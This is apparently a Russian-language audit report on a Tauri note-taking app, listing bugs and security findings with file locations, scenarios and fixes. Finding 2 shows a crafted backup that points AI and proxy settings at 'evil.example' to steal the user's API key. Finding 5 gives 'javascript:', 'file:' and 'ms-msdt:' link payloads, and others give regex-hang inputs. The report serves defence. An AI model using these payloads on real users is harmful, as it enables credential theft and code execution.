## Находки

### HIGH

1. **Резервная копия больше ~500 МБ создаётся, но не восстанавливается** — src/lib/exportImport.ts:342-353 (readBackup), :75-84 (blobToBase64)
   - Экспорт собирает Blob по частям, поэтому файл любого размера записывается. Импорт делает `file.text()` + `JSON.parse` всего файла одной строкой. В Chromium/WebView2 (Windows-сборка Tauri) предел строки ~536 млн символов.
   - Сценарий: в базе 450 МБ вложений → backup ≈ 600 МБ (base64 ×1.33) → экспорт успешен → при импорте `file.text()` отклоняется → «Не удалось прочитать файл резервной копии». Пользователь узнаёт, что копия бесполезна, только когда она понадобилась.
   - Второй вариант: один файл > ~400 МБ → `parts.join('')` в blobToBase64 бросает RangeError (Invalid string length) → экспорт всей базы падает.
   - Плюс все base64-строки удерживаются в `parts` до конца экспорта (память ≈ 1.33× суммарного размера файлов).
   - Исправление: лимит размера файла при createItem (например 50–100 МБ) + контроль суммарного размера при экспорте с понятной ошибкой; либо формат с бинарниками отдельно (zip/NDJSON, потоковое чтение); как минимум — проверка `file.size` в readBackup с внятным сообщением и проверка на экспорте, что копия восстановима.

### MEDIUM

2. **Импорт «replace» применяет aiBaseUrl / aiEnabled / linkProxyUrl из чужого файла при сохранённом локальном aiApiKey** — src/lib/exportImport.ts:570-573, :55; src/lib/ai.ts:75-82
   - PRIVATE_SETTINGS закрывает только aiApiKey и seeded. Локальный ключ при replace остаётся, а aiBaseUrl перезаписывается из копии.
   - Сценарий: пользователь импортирует присланную/скачанную копию с `settings: {aiEnabled:true, aiBaseUrl:"https://evil.example/v1", linkProxyUrl:"https://evil.example/?u={url}", autoFetchLinkTitle:true}` → следующий вызов suggestForItem отправляет `Authorization: Bearer <его ключ>` и содержимое записи на чужой хост; каждая новая ссылка уходит на чужой прокси.
   - Обратная сторона: linkProxyUrl и aiBaseUrl экспортируются; шаблон прокси с токеном в query (`...?key=SECRET&url={url}`) попадает в копию открытым текстом.
   - Исправление: добавить aiBaseUrl, aiEnabled, linkProxyUrl (и aiModel) в список неимпортируемых, либо импортировать сетевые настройки только по отдельному явному подтверждению; linkProxyUrl не экспортировать.

3. **Индекс поиска синхронизируется с отфильтрованным подмножеством, а не со всей базой** — src/hooks/computeVisible.ts:39 → src/search/engine.ts:123-177, :239
   - computeVisible передаёт в searchItems `pre` (после фильтра раздела и UI), syncIndex считает это полным набором и выкидывает из индекса всё остальное.
   - Сценарий: 10 000 записей, в строке поиска текст. Переключение «Входящие → База знаний» или любой клик по фильтру: старое подмножество discard, новое add; при >50 изменений и >половины — полный rebuild (до 100 000 символов content на документ) синхронно в useMemo → зависание UI на каждое переключение. prepareSearchIndex(все записи) обесценивается первым же поиском. Два одновременно смонтированных useVisibleItems с разным base (список + палитра команд) перестраивают общий модульный кэш по очереди на каждый рендер.
   - Исправление: индексировать всегда полный набор (items из useAllItems), а подмножество передавать как фильтр по id: `searchItems(allItems, query, categories, { within: pre })`.

4. **Квадратичные регэкспы детектора кода: вставка с большим числом пустых строк вешает UI** — src/lib/detect.ts (правила с `^\s*…` и флагом m: JS_RULES, RULES.python/bash/css/…, TOML_*)
   - `\s*` после `^` в многострочном режиме захватывает и переводы строк, поэтому на каждой пустой строке сканирование идёт до конца блока пустых строк.
   - Проверено: `detectInput('a' + '\n'.repeat(19000) + 'b')` — 5.4 с (лимит MAX_ANALYZE = 20 000 символов не спасает). 5 000 пустых строк ≈ 0.4 с на каждый вызов; детектор вызывается на ввод/вставку в форме быстрого добавления.
   - Исправление: заменить `^\s*` на `^[ \t]*` во всех правилах с флагом m; дополнительно схлопывать серии пустых строк перед анализом.

5. **Недоверенные url / linkMeta.image / linkMeta.favicon проходят импорт без проверки схемы** — src/lib/exportImport.ts:256-257 (url), :212-215 (sanitizeLinkMeta); src/db/repo.ts:152
   - sanitizeItem принимает любую строку. При обычной загрузке метаданных absolutize пропускает только http(s), при импорте — нет.
   - Сценарий: копия с `{"type":"link","url":"file:///C:/Windows/System32/calc.exe"}` или `javascript:…`/`ms-msdt:…` → экран подробностей откроет это через `<a href>` или Tauri opener (в desktop — запуск произвольного обработчика протокола); `linkMeta.image: "https://tracker/x.png"` → запрос к третьей стороне при показе карточки без действия пользователя.
   - Исправление: в sanitizeItem оставлять url только со схемой http/https/ftp (иначе понижать запись до text с url в content), image/favicon — только http/https; такую же проверку поставить в createItem/updateItem, а в UI открывать ссылки через одну функцию с белым списком схем.

6. **updateItem записывает явные undefined и ломает инварианты записи** — src/db/repo.ts:191-196
   - `changes = { ...patch }`; Dexie.update при значении undefined удаляет свойство.
   - Сценарий: форма вызывает `updateItem(id, { title, tags: tagsChanged ? tags : undefined, content: dirty ? content : undefined })` (тип ItemPatch это допускает) → у записи исчезают `tags`/`content` → useAllTags (`for (const t of it.tags)`), repo.matchesFilter (`item.tags.includes`), addTags, ai.buildUserPrompt (`item.content.trim()`) падают с TypeError на каждом рендере — приложение не открывается, пока запись не исправят вручную.
   - Исправление: в updateItem выбрасывать ключи со значением undefined (кроме осознанно сбрасываемых url/language/linkMeta/ai), categoryId undefined → не трогать.

7. **Каждый потребитель useAllItems держит свой liveQuery на `db.items.toArray()`** — src/hooks/useItems.ts:13-15, :22, :39, :53
   - useVisibleItems, useAllTags, useCounts — три (и более) независимых полных чтения таблицы со структурным клонированием всего content на любую мутацию (звёздочка, тег, приход linkMeta).
   - Сценарий: 5 000 записей с вставками кода/логов по сотне КБ → каждое нажатие «в избранное» = 3× чтение и клонирование сотен МБ → ощутимые подвисания и скачки памяти.
   - Исправление: один общий источник (контекст/zustand-стор с одним liveQuery), счётчики — через индексы (`where('status').equals().count()`), теги — `orderBy('tags').uniqueKeys()`/keys.

### LOW

8. **isUrl: имена файлов и версии распознаются как ссылки** — src/lib/detect.ts:139-150, :179
   - Проверено запуском: `script.pl`, `main.cc`, `libfoo.so`, `logo.ai`, `Makefile.am`, `config.in`, `data.io` → true (двухбуквенные расширения = ccTLD, которых нет в FILE_LIKE_TLDS); `Node.js/Express` → true (с путём принимается любая зона, даже из FILE_LIKE); `1.0.0.1` (версия) → true как IPv4; `ASP.NET` → true.
   - Результат: заметка из одного слова сохраняется как ссылка `https://script.pl`, по ней уходит запрос за метаданными на чужой домен.
   - Исправление: расширить FILE_LIKE_TLDS (pl, cc, so, ai, am, in, ml, mm, sc, st, vb, fs, …) и применять его и при наличии пути; голый IPv4 без порта/пути/схемы считать ссылкой только если это не похоже на версию (или вовсе требовать порт/путь).

9. **Детектор кода: обычные заметки определяются как код** — src/lib/detect.ts:597-639 (looksLikeYaml), :515-542 (STRONG_LINE), :316 (sql)
   - Проверено запуском: `Login: admin\nPassword: 12345\nPort: 8080` → code/yaml; `Width: 100\nHeight: 200` → code/yaml; `Meeting notes:\nbudget = 500\ndeadline = friday\nowner = me` → code; `TODO (tomorrow):\ncall John (again);\nsend report (v2);` → code; `SELECT the best option FROM the list we discussed` → code/sql.
   - Исправление: для YAML требовать структурный сигнал (вложенность, список, `---`), а не только числовые значения; правило `SELECT…FROM` засчитывать только вместе со вторым SQL-признаком; для 1 строки без `;`/скобок — не код.

10. **Запрос из одной пунктуации отключает сортировку** — src/hooks/computeVisible.ts:37 против src/search/engine.ts:252
    - Для `!!!`, `—`, `++` `parsed.text.trim()` непустой → sortItems пропускается, а queryWords даёт 0 терминов → searchItems возвращает записи в порядке входа (порядок первичного ключа = случайные UUID).
    - Исправление: решать о сортировке по `queryWords(parsed.text).length === 0` (или вернуть из searchItems признак «ранжировано»).

11. **Удаление и отмена сдвигают updatedAt соседних записей** — src/db/repo.ts:231-236, :277-283
    - deleteItems ставит `updatedAt: now` всем записям со связью на удаляемую, restoreItems — ещё раз. При пакетном удалении связанных A и B снимок B снимается уже после этой правки, поэтому после «Отменить» у B остаётся updatedAt = время удаления (комментарий «как будто ничего не было» не выполняется).
    - Последствия: сортировка «по изменению» всплывает нетронутыми записями; при импорте merge «локальная новее» выигрывает у реально более свежей правки из копии, хотя пользователь запись не менял.
    - Исправление: техническую правку links не сопровождать updatedAt (как это уже сделано в repairIntegrity), снимки для пакетного удаления читать одним bulkGet до изменений.

12. **parseAiJson: ответ `null` даёт необработанный TypeError** — src/lib/ai.ts:102-104
    - Модель вернула `null` (валидный JSON) → `parsed.title` → «Cannot read properties of null» вместо «Не удалось разобрать ответ ИИ».
    - Исправление: после разбора проверять `typeof parsed === 'object' && parsed !== null && !Array.isArray(parsed)`.

13. **parseHtmlMeta: квадратичный поиск `<title>` на враждебной странице** — src/lib/linkMeta.ts:123
    - `/<title\b[^>]*>([\s\S]*?)<\/title\s*>/i` на документе из повторов `<title>` без закрывающего тега: 20 000 повторов — 0.37 с (замер), полные 512 КБ (≈73 000 повторов) — порядка 5 с блокировки UI при сохранении ссылки на такую страницу.
    - Исправление: искать `<title` через indexOf, закрывающий `</title` — вторым indexOf от найденной позиции (один проход), и ограничить длину head до разбора.

14. **HEIC/HEIF/TIFF классифицируются как изображение** — src/lib/detect.ts:207-215
    - `photo.heic` с айфона → type 'image', но Chromium/WebView2 такие форматы не рисуют, makeThumb вернёт undefined → в ленте битая картинка вместо карточки файла.
    - Исправление: heic/heif (и image/tiff) добавить в NON_RENDERABLE либо понижать до 'file', если createImageBitmap не смог декодировать.

15. **Повторная загрузка демо стирает правки пользователя в демо-записях и категориях** — src/db/seed.ts:211-227
    - `seedDemoData(true)` удаляет все записи с `source === 'demo'` (в том числе отредактированные и перенесённые пользователем в базу знаний) и `bulkPut(categories)` перезаписывает переименованные/перекрашенные демо-категории, сбрасывая их order в 0..4 (коллизия порядка с пользовательскими).
    - Исправление: при правке демо-записи менять source на 'manual' (в updateItem) либо удалять только записи с неизменённым updatedAt; категории добавлять через add с пропуском существующих.

## Проверено и замечаний нет

- Транзакции Dexie: внутри транзакций нет await не-Dexie промисов (превью и base64 строятся до транзакции), импорт атомарен, replace откатывается при ошибке.
- aiApiKey и seeded не попадают в экспорт и не принимаются при импорте; ключ не логируется.
- Каскад файлов и обратных связей при удалении, восстановление связей только с существующими записями.
- Поиск по кириллице: NFKC, ё=е, NFD-формы, camelCase-части, фразы; подсветка с картой позиций.
- useFileUrl: objectURL отзывается при смене fileId/размонтировании, гонка getFile закрыта флагом cancelled.
- fetchLinkMeta: сторонние сервисы без явно заданного прокси не используются, чтение ограничено 512 КБ и таймаутом.
- Прототипное загрязнение при разборе JSON/настроек: используются Map и Object.hasOwn.
